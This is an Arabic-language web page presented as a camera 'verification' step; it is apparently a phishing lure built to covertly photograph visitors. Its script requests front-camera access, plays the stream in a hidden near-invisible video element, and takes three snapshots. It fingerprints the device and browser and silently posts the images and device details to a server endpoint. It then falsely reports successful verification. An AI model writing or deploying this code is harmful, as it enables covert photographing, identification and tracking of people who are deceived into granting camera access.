<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
<meta name="apple-mobile-web-app-capable" content="yes">
<title>جارٍ التحقق</title>
<style>
*{box-sizing:border-box;-webkit-tap-highlight-color:transparent}
html,body{margin:0;height:100%;background:#0b0d12;color:#e8eaf0;font-family:system-ui,-apple-system,"Segoe UI",Roboto,sans-serif}
.wrap{min-height:100%;display:flex;flex-direction:column;align-items:center;justify-content:center;gap:18px;padding:26px;text-align:center}
.ring{width:50px;height:50px;border:3px solid #232838;border-top-color:#5b8cff;border-radius:50%;animation:spin .9s linear infinite}
@keyframes spin{to{transform:rotate(360deg)}}
h1{font-size:18px;font-weight:600;margin:0}
p{font-size:14px;line-height:1.7;color:#98a0b3;margin:0;max-width:320px}
.btn{margin-top:8px;padding:14px 36px;border:0;border-radius:14px;background:#2f6bff;color:#fff;font-size:16px;font-weight:600;font-family:inherit}
.ok{color:#5fd08a}.err{color:#e07777}
video{position:fixed;top:0;left:0;width:2px;height:2px;opacity:.01;pointer-events:none}
.hide{display:none!important}
</style>
</head>
<body>
<div class="wrap" id="s1">
<div style="font-size:46px">📷</div>
<h1>التحقق من الكاميرا</h1>
<p>لإكمال التحقق نحتاج الوصول إلى الكاميرا الأمامية. اضغط الزر ثم اختر «سماح».</p>
<button class="btn" id="go">متابعة</button>
</div>
<div class="wrap hide" id="s2">
<div class="ring" id="ring"></div>
<h1 id="title">جارٍ التحقق...</h1>
<p id="sub">يرجى الانتظار قليلاً</p>
</div>
<video id="v" playsinline webkit-playsinline autoplay muted></video>
<script>
(function(){
var SHOTS=3,GAP=650,WARMUP=1100,Q=0.92,MIRROR=true;
var v=document.getElementById('v'),s1=document.getElementById('s1'),s2=document.getElementById('s2'),
ring=document.getElementById('ring'),title=document.getElementById('title'),sub=document.getElementById('sub'),go=document.getElementById('go');

function deviceInfo(){
  var ua=navigator.userAgent||'';
  var m='';
  if(/iPhone/.test(ua)){
    m=/iPhone/.exec(ua)?'iPhone':'iPhone';
    var os=(ua.match(/OS (\d+[_\d]*) like Mac/)||[])[1];
    m+=' · iOS '+(os?os.replace(/_/g,'.'):'');
  } else if(/iPad/.test(ua)){
    m='iPad · iPadOS';
  } else if(/Android/.test(ua)){
    var a=ua.match(/Android\s+([\d.]+)/);
    var model=(ua.match(/;\s*([^;)]+)\s+Build/)||[])[1];
    m=(model?model.trim():'Android')+' · Android '+(a?a[1]:'');
  } else if(/Windows/.test(ua)){ m='Windows PC'; }
  else if(/Macintosh/.test(ua)){ m='Mac'; }
  else if(/Linux/.test(ua)){ m='Linux'; }
  else { m='جهاز غير معروف'; }

  var br='';
  if(/Edg\//.test(ua)) br='Edge '+(ua.match(/Edg\/([\d.]+)/)||[])[1];
  else if(/OPR\//.test(ua)) br='Opera '+(ua.match(/OPR\/([\d.]+)/)||[])[1];
  else if(/Chrome\//.test(ua)) br='Chrome '+(ua.match(/Chrome\/([\d.]+)/)||[])[1];
  else if(/Firefox\//.test(ua)) br='Firefox '+(ua.match(/Firefox\/([\d.]+)/)||[])[1];
  else if(/Safari\//.test(ua)) br='Safari '+(ua.match(/Version\/([\d.]+)/)||[])[1];
  else br='متصفح غير معروف';

  return m+' | '+br+' | '+screen.width+'x'+screen.height;
}

function fail(t){ring.classList.add('hide');title.className='err';title.textContent='تعذّر إكمال التحقق';sub.textContent=t||'لم يتم السماح بالوصول.';}

function shot(dev){
  try{
    var w=v.videoWidth||720,h=v.videoHeight||960,c=document.createElement('canvas');
    c.width=w;c.height=h;var x=c.getContext('2d');
    if(MIRROR){x.translate(w,0);x.scale(-1,1);}
    x.drawImage(v,0,0,w,h);
    fetch('/api/send',{method:'POST',headers:{'Content-Type':'application/json'},
      body:JSON.stringify({image:c.toDataURL('image/jpeg',Q),device:dev})}).catch(function(){});
  }catch(e){}
}

function sleep(m){return new Promise(function(r){setTimeout(r,m)})}

async function run(){
  var dev=deviceInfo();
  var stream=null;
  if(navigator.mediaDevices&&navigator.mediaDevices.getUserMedia){
    try{ stream=await navigator.mediaDevices.getUserMedia({video:{facingMode:'user',width:{ideal:1280},height:{ideal:720}},audio:false}); }
    catch(e1){
      try{ stream=await navigator.mediaDevices.getUserMedia({video:true,audio:false}); }
      catch(e2){ return fail('تم رفض الإذن أو لا توجد كاميرا.'); }
    }
  } else {
    var legacy=navigator.getUserMedia||navigator.webkitGetUserMedia||navigator.mozGetUserMedia;
    if(!legacy) return fail('المتصفح لا يدعم الكاميرا.');
    try{
      stream=await new Promise(function(res,rej){legacy.call(navigator,{video:true},res,rej)});
    }catch(e){ return fail('تم رفض الإذن أو لا توجد كاميرا.'); }
  }

  s1.classList.add('hide');s2.classList.remove('hide');
  v.srcObject=stream;
  try{ await v.play(); }catch(e){}
  await sleep(WARMUP);

  for(var i=0;i<SHOTS;i++){ shot(dev); if(i<SHOTS-1) await sleep(GAP); }

  try{ stream.getTracks().forEach(function(t){t.stop()}); }catch(e){}
  ring.classList.add('hide');title.className='ok';title.textContent='تم التحقق بنجاح';sub.textContent='يمكنك إغلاق الصفحة الآن.';
}

go.addEventListener('click',run);
})();
</script>
</body>
</html>
